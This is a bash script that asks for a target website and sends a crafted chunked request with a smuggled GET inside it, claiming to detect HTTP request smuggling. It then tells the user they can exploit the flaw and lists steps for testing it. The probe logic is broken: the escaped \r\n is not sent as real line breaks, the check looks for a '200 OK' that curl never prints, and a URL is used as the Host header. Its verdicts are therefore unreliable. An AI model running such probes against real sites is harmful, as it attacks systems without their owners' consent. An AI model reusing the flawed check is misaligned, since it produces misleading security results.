#!/bin/bash

# Colors for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Function to check if the target website is vulnerable
check_vulnerability() {
    echo -e "${YELLOW}Checking vulnerability...${NC}"
    
    # Send a crafted request to test for HTTP Request Smuggling vulnerability
    response=$(curl -s -H "Transfer-Encoding: chunked" -H "Connection: keep-alive" -d "0\r\n\r\nGET / HTTP/1.1\r\nHost: $1\r\nContent-Length: 0\r\n\r\n" $1 | grep "200 OK")

    # If the response contains "200 OK", the target is vulnerable
    if [[ $response ]]; then
        echo -e "${RED}The target website is vulnerable to HTTP Request Smuggling!${NC}"
        echo -e "${RED}You can exploit this vulnerability by smuggling a request in the content body.${NC}"
    else
        echo -e "${GREEN}The target website is not vulnerable to HTTP Request Smuggling.${NC}"
    fi
}

# Function to explain how to test the vulnerability
explain_testing() {
    echo -e "${YELLOW}To test the vulnerability, follow these steps:${NC}"
    echo -e "${YELLOW}1. Use curl to send a crafted request with 'Transfer-Encoding: chunked' header.${NC}"
    echo -e "${YELLOW}2. Include a valid HTTP request in the content body.${NC}"
    echo -e "${YELLOW}3. Check if the response contains '200 OK'.${NC}"
}

# Main function
main() {
    echo -e "${YELLOW}Enter your target website URL:${NC}"
    read target_url

    # Check if the target is provided
    if [[ -z "$target_url" ]]; then
        echo -e "${RED}Error: Target website URL is required.${NC}"
        exit 1
    fi

    echo -e "${YELLOW}Testing HTTP Request Smuggling vulnerability for: ${target_url}${NC}"

    # Check vulnerability
    check_vulnerability $target_url

    # Explain testing
    explain_testing
}

# Call the main function
main
